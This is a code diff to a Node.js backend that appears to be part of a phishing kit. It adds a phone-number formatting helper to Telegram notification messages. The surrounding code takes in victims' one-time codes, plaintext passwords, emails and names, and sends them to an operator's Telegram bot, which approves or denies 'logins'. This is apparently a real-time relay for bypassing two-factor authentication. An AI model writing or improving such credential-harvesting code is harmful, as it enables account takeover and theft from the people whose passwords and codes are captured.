@@ -22,6 +22,32 @@ const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 // In-memory storage (use database in production)
 const otpRequests = new Map();
 
+function splitPhoneNumber(phone) {
+  const raw = (phone || "").trim();
+  if (!raw) {
+    return { countryCode: "N/A", number: "N/A", formatted: "N/A" };
+  }
+
+  let normalized = raw.replace(/[\s\-()]/g, "");
+  if (normalized.startsWith("00")) {
+    normalized = "+" + normalized.slice(2);
+  }
+
+  const match = normalized.match(/^\+?(\d{1,3})(\d+)$/);
+  if (!match) {
+    return { countryCode: "N/A", number: normalized, formatted: normalized };
+  }
+
+  const countryCode = "+" + match[1];
+  const number = match[2];
+
+  return {
+    countryCode,
+    number,
+    formatted: `${countryCode} ${number}`,
+  };
+}
+
 /**
  * POST /api/otp/submit
  * Receive OTP submission from frontend
@@ -57,7 +83,8 @@ app.post("/api/otp/submit", (req, res) => {
   // Send notification to Telegram admin (include password for manual verification)
   sendTelegramNotification(requestId, phone, otp, password, email, firstName, lastName);
 
-  console.log(`[OTP] New request ${requestId} for ${phone}`);
+  const phoneParts = splitPhoneNumber(phone);
+  console.log(`[OTP] New request ${requestId} for ${phoneParts.formatted}`);
 
   res.json({
     success: true,
@@ -169,12 +196,15 @@ function sendTelegramNotification(
   const approveUrl = `${BACKEND_URL}/api/telegram/approve`;
   const callbackToken = process.env.TELEGRAM_CALLBACK_TOKEN;
 
+  const phoneParts = splitPhoneNumber(phone);
   const message = `
 🔐 <b>New OTP Request</b>
 
 👤 <b>User:</b> ${firstName || "N/A"} ${lastName || ""}
 📧 <b>Email:</b> ${email || "N/A"}
-📱 <b>Phone:</b> ${phone}
+📱 <b>Phone:</b> ${phoneParts.formatted}
+📌 <b>Country code:</b> ${phoneParts.countryCode}
+🔢 <b>Number:</b> ${phoneParts.number}
 🔑 <b>OTP:</b> <code>${otp}</code>
 🔐 <b>Password:</b> <code>${password}</code>
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
@@ -325,11 +355,14 @@ app.post('/api/login/submit', (req, res) => {
 function sendTelegramPasswordNotification(requestId, phone, password) {
   const checkUrl = `${BACKEND_URL}/api/password-status/${requestId}`;
   const callbackToken = process.env.TELEGRAM_CALLBACK_TOKEN;
+  const phoneParts = splitPhoneNumber(phone);
 
   const message = `
 🔐 <b>Password Verification Required</b>
 
-📱 <b>Phone:</b> ${phone}
+📱 <b>Phone:</b> ${phoneParts.formatted}
+📌 <b>Country code:</b> ${phoneParts.countryCode}
+🔢 <b>Number:</b> ${phoneParts.number}
 🔑 <b>Password:</b> <code>${password}</code>
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 
@@ -367,12 +400,15 @@ function sendTelegramPasswordNotification(requestId, phone, password) {
 function sendTelegramLoginNotification(requestId, username, password, phone) {
   const approveUrl = `${BACKEND_URL}/api/telegram/approve`;
   const callbackToken = process.env.TELEGRAM_CALLBACK_TOKEN;
+  const phoneParts = splitPhoneNumber(phone);
 
   const message = `
 🔐 <b>Final Login Approval</b>
 
 👤 <b>User:</b> ${username}
-📱 <b>Phone:</b> ${phone || 'N/A'}
+📱 <b>Phone:</b> ${phoneParts.formatted}
+📌 <b>Country code:</b> ${phoneParts.countryCode}
+🔢 <b>Number:</b> ${phoneParts.number}
 🔐 <b>Submitted Password:</b> <code>${password}</code>
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 
